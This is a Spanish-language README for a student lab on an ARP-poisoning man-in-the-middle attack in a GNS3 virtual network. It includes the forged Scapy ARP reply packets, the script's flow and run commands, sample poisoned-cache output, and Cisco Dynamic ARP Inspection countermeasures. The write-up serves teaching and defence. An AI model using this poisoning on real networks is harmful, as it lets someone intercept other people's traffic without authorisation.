<div align="center">

# 🕵️ ARP MitM Attack

**Luiggy Habraham Encarnación Cabrera · Matrícula 2025-0663**

![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=linux&logoColor=white)
![Scapy](https://img.shields.io/badge/Library-Scapy-FF6F00?style=for-the-badge)
![GNS3](https://img.shields.io/badge/Simulator-GNS3-009639?style=for-the-badge)
![License](https://img.shields.io/badge/Uso-Educativo-blue?style=for-the-badge)

> Ataque Man-in-the-Middle mediante envenenamiento continuo de la caché ARP de la víctima y el gateway, interceptando de forma transparente todo el tráfico entre ambos.

</div>

---

## ⚠️ Aviso Legal

> [!CAUTION]
> Este repositorio tiene fines **exclusivamente académicos y educativos**.
> Todo el contenido fue ejecutado en un entorno de laboratorio virtualizado y controlado.
> La reproducción de estas técnicas en redes sin autorización expresa es **ilegal**.

---

## 📑 Tabla de Contenido

1. [Objetivo del Laboratorio](#-objetivo-del-laboratorio)
2. [Objetivo del Script](#-objetivo-del-script)
3. [Requisitos](#-requisitos-para-utilizar-la-herramienta)
4. [Instalación](#-instalación)
5. [Documentación de la Red](#-documentación-de-la-red)
6. [Funcionamiento del Script](#-funcionamiento-del-script)
7. [Uso y Ejecución](#-uso-y-ejecución)
8. [Contramedidas](#-contramedidas)
9. [Capturas de Pantalla](#-capturas-de-pantalla)
10. [Video de Demostración](#-video-de-demostración)

---

## 🎯 Objetivo del Laboratorio

Demostrar cómo un atacante ubicado en la misma red de Capa 2 puede realizar un ataque *Man-in-the-Middle* (MitM) aprovechando la falta de autenticación del protocolo ARP. Mediante el envenenamiento continuo de las cachés ARP de la víctima y el gateway, el atacante intercepta todo el tráfico entre ambos sin interrumpir la comunicación, gracias al reenvío transparente mediante IP forwarding.

---

## 🧩 Objetivo del Script

El script `arp_mitm.py` envenena de forma continua y simultánea las tablas ARP de la víctima y del gateway, haciendo que ambos asocien la MAC del atacante con la IP del otro extremo. Esto posiciona al atacante como intermediario invisible de toda la comunicación. Al detenerse, el script restaura automáticamente las cachés ARP reales de ambos dispositivos.

### Parámetros Usados

| Parámetro | Tipo | Descripción | Ejemplo |
|---|---|---|---|
| Interfaz de red | Interactivo | Interfaz del atacante en la red | `e0` |
| IP de la víctima | Interactivo | Dirección IP del host a interceptar | `10.6.63.50` |
| IP del gateway | Interactivo | Dirección IP del router/gateway | `10.6.63.1` |
| Intervalo de envío | Constante en código | Segundos entre rondas de envenenamiento | `1.5s` |

### Requisitos para Utilizar la Herramienta

| Requisito | Detalle |
|---|---|
| Sistema operativo | Kali Linux 2023+ (o cualquier Linux) |
| Python | 3.10 o superior |
| Librería Scapy | `scapy >= 2.5.0` |
| Privilegios | `sudo` o `root` obligatorio |
| IP forwarding | El script lo activa automáticamente en el kernel |
| Conectividad | Capa 2 con víctima y gateway activa |

---

## ⚙️ Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/luiggyencarnacion/ARP-MitM-Attack.git
cd ARP-MitM-Attack

# 2. Crear entorno virtual
python3 -m venv venv
source venv/bin/activate

# 3. Instalar dependencias
pip install -r requirements.txt

# 4. Verificar
python3 -c "from scapy.all import ARP, Ether; print('Scapy OK')"
```

**`requirements.txt`**
```
scapy>=2.5.0
```

---

## 🗺️ Documentación de la Red

### Topología

```
                    ┌─────────┐
                    │   R-1   │  10.6.63.1/24  ← Gateway
                    └────┬────┘
                         │ g0/0
                         │ Gig0/0
                    ┌────┴────┐
                    │  SW-1   │
                    └──┬───┬──┘
               Gig0/2  │   │  Gig0/1
              ┌────────┘   └───────────┐
         ┌────┴──────┐            ┌────┴─────┐
         │KaliLinux-1│            │   PC1    │
         │  Atacante │            │ Víctima  │
         │10.6.63.13 │            │10.6.63.50│
         └───────────┘            └──────────┘
               e0                      e0

  Tráfico interceptado:
  PC1 ──► Atacante (Kali) ──► R-1   [en lugar de PC1 ──► R-1]
```

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | Rol |
|---|---|---|---|---|
| R-1 | g0/0 | 10.6.63.1 | /24 | Gateway |
| SW-1 | Gig0/0 | — | — | Switch de acceso |
| SW-1 | Gig0/1 | — | — | Enlace hacia PC1 |
| SW-1 | Gig0/2 | — | — | Enlace hacia KaliLinux-1 |
| KaliLinux-1 | e0 | 10.6.63.13 | /24 | Atacante (MitM) |
| PC1 | e0 | 10.6.63.50 | /24 | Víctima |

### Detalles del Entorno

| Parámetro | Valor |
|---|---|
| Red | 10.6.63.0/24 |
| Simulador | GNS3 |
| Plataforma atacante | Kali Linux |
| Dispositivos Cisco | IOU (IOS on Unix) |
| VLANs | VLAN 1 (default) |

---

## 🔬 Funcionamiento del Script

### Flujo General

```
Inicio
  └── Ingreso: interfaz, IP víctima, IP gateway
        └── Resolución de MACs reales (ARP legítimo con srp())
              └── Activar IP forwarding (ip_forward=1)
                    └── Bucle cada 1.5s:
                          ├── poison(víctima ← MAC atacante como gateway)
                          └── poison(gateway ← MAC atacante como víctima)
  └── Ctrl+C
        └── restore(víctima)   ← 5 paquetes ARP correctos
        └── restore(gateway)   ← 5 paquetes ARP correctos
        └── Resumen Final
```

### Paquete ARP Reply Falsificado

```python
# Enviado a la víctima: "el gateway tiene mi MAC"
Ether(dst=victim_mac) / ARP(
    op=2,
    pdst=victim_ip,    hwdst=victim_mac,
    psrc=gateway_ip,   hwsrc=attacker_mac   # ← MAC del atacante
)

# Enviado al gateway: "la víctima tiene mi MAC"
Ether(dst=gateway_mac) / ARP(
    op=2,
    pdst=gateway_ip,   hwdst=gateway_mac,
    psrc=victim_ip,    hwsrc=attacker_mac   # ← MAC del atacante
)
```

### Salida en Tiempo Real

```
  Tiempo    Envenenamientos       Estado
  ─────────────────────────────────────────
  00:01          1              Activo ✓
  00:03          2              Activo ✓
  00:04          3              Activo ✓
```

### Resumen Final (al presionar Ctrl+C)

```
  ╔════════════════════════════════════════╗
  ║            Resumen Final               ║
  ╚════════════════════════════════════════╝
  Envenenamientos enviados : 48
  Tiempo activo            : 01:12
  Paquetes ARP totales     : 96
```

---

## 🚀 Uso y Ejecución

```bash
sudo python3 arp_mitm.py
```

**Interacción esperada:**

```
  Ingrese la IP de la víctima   : 10.6.63.50
  Ingrese la IP del gateway     : 10.6.63.1

  ╔════════════════════════════════════════╗
  ║           ARP MitM Attack              ║
  ╚════════════════════════════════════════╝
  Interfaz  : e0
  Víctima   : 10.6.63.50
  Gateway   : 10.6.63.1
  ──────────────────────────────────────────
  MAC Víctima  : 00:50:79:66:68:01
  MAC Gateway  : c2:01:0a:06:00:00
  MAC Atacante : 0c:e4:2a:xx:xx:xx
  [*] IP Forwarding habilitado
  [*] Iniciando envenenamiento ARP...
```

**Verificación del impacto en la víctima:**

```
# Tabla ARP de PC1 envenenada:
PC1> arp -a
  10.6.63.1  →  0c:e4:2a:xx:xx:xx   ← MAC del ATACANTE (debe ser del router)
```

```
SW-1# show arp
SW-1# clear arp
```

---

## 🔐 Contramedidas

### Dynamic ARP Inspection (DAI) + DHCP Snooping

```
! Paso 1: Habilitar DHCP Snooping (base de datos para DAI)
SW-1(config)# ip dhcp snooping
SW-1(config)# ip dhcp snooping vlan 1

! Paso 2: Habilitar Dynamic ARP Inspection
SW-1(config)# ip arp inspection vlan 1

! Paso 3: Marcar el puerto hacia el router como trusted
SW-1(config)# interface GigabitEthernet0/0
SW-1(config-if)# ip arp inspection trust

! El puerto hacia KaliLinux-1 (Gig0/2) queda untrusted por defecto
! Todo ARP Reply desde ese puerto se valida contra la binding table
```

### Verificación

```
SW-1# show ip arp inspection vlan 1
SW-1# show ip arp inspection statistics
SW-1# show ip dhcp snooping binding
```

### Tabla Resumen

| Contramedida | Efectividad | Impacto operacional |
|---|---|---|
| DAI + DHCP Snooping | Muy alta | Bajo |
| ARP estático en hosts críticos | Alta | Alto (gestión manual) |
| Monitoreo con arpwatch | Media (detección) | Bajo |

---

## 📸 Capturas de Pantalla

```
evidencias/
├── 01_topologia_gns3.png
├── 02_ataque_en_ejecucion.png
├── 03_arp_table_victima_envenenada.png
├── 04_trafico_wireshark_interceptado.png
├── 05_contramedida_dai_aplicada.png
└── 06_verificacion_dai_bloqueando.png
```

---

## 🎬 Video de Demostración

> 📺 **[Ver demostración en YouTube →](https://youtu.be/TzIkY6gyWcc?si=VyapQS7zCNzDfu8a)**

- ✅ Topología en GNS3 con nombre **Luiggy Encarnación** y matrícula **2025-0663**
- ✅ Hora y fecha del sistema visibles
- ✅ Cara y voz del autor
- ✅ Envenenamiento ARP activo con contador en tiempo real
- ✅ Verificación de tabla ARP envenenada en la víctima
- ✅ Aplicación de DAI y verificación de bloqueo
- ⏱️ Duración máxima: 5 minutos

---

<div align="center">

*Documento elaborado con fines académicos en un entorno de laboratorio controlado.*
*El uso de estas técnicas fuera de entornos autorizados es ilegal.*

</div>
